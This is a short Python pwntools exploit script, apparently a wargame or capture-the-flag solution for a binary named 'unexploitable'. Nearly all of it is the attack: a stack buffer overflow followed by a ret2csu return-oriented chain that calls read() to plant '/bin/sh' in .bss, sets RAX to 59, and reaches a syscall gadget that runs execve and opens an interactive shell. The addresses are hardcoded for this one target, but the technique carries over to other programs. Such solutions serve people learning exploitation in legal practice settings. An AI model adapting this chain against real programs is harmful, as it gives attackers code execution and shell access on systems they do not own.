from pwn import *
import time

ret2csu_pops             = p64(0x00000000004005e6)
ret2csu_rdx_rsi_edi      = p64(0x00000000004005ca) #  mov rdx, r15; mov rsi, r14; mov edi, r13d
read_plt                 = p64(0x0000000000400430)
read_got                 = p64(0x0000000000601000)
sleep_got                = p64(0x0000000000600e68)
binsh_bss                = p64(0x0000000000601900)
address_bss              = p64(0x0000000000601a00)
syscall                  = p64(0x0000000000400560)




def chain(func, arg1, arg2, arg3):
    chained = ret2csu_pops
    chained += p64(0) # 8-byte padding
    chained += p64(0) # rbx
    chained += p64(1) # rbp
    chained += func   # r12 -> call dword [r12]
    chained += arg1   # r13 -> edi
    chained += arg2   # r14 -> rsi
    chained += arg3   # r15 -> rdx
    chained += ret2csu_rdx_rsi_edi
    chained += p64(0) * 7
    return chained

sh = process("/home/unexploitable/unexploitable")
sleep(4)



payload = "A" * 24
payload += chain(read_got, p64(0), binsh_bss, p64(8))     # place the string "/bin/sh" on the bss section
payload += chain(read_got, p64(0), address_bss, p64(59))  # read 59 bytes so RAX=59
payload += chain(address_bss, binsh_bss, p64(0), p64(0))  # now we call execve("/bin/sh\0", NULL, NULL)!


sh.send(payload)
payload2 = "/bin/sh\0"
sh.send(payload2)
payload3 = syscall + "A" * 51
sh.send(payload3)
sh.interactive()